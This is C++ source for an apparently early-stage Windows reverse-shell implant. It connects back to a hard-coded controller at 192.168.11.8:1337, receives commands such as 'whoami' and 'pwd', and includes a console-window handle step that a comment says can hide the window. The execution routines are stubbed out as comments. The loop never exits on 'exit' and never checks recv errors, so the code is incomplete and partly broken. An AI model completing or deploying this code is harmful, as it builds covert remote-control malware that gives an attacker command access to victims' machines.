//C++ Headers

#include <winsock2.h>       //Socket Header
#include <windows.h>        //Win API Header
#include <ws2tcpip.h>       //TCP-IP Header
//C Header
#include <stdio.h>          //Input Output Header

//Debug C++ Header
#include <iostream>     //Input Output Debug Header

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.11.8");
    addr.sin_port = htons(1337);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected. Waiting for client to input command..." << std::endl;

        char CommandReceived[DEFAULT_BUFLEN] = "";
        while(true)
        {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            std::cout << "Command received: " << CommandReceived;
            std::cout << "Length of Command received: " << Result << std::endl;
            
            if ((strcmp(CommandReceived, "whoami\n") == 0)) {
                std::cout << "Command parsed: whoami" << std::endl;
                // Execute a whoami() function
            }
            else if ((strcmp(CommandReceived, "pwd\n") == 0)) {
                std::cout << "Command parsed: pwd" << std::endl;
                // Execute a pwd() function
            }
            else if ((strcmp(CommandReceived, "exit\n") == 0)) {
                std::cout << "Command parsed: exit" << std::endl;
                std::cout << "Closing Connection... Goodbye!" << std::endl;
                // Execute gracefully
            }
            else
            {
                std::cout << "Command not parsed!" << std::endl; 
            }

            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

//Main function

int main()
{
    HWND stealth;           //Declare a window handle 
    AllocConsole();     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,SW_SHOWNORMAL);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}

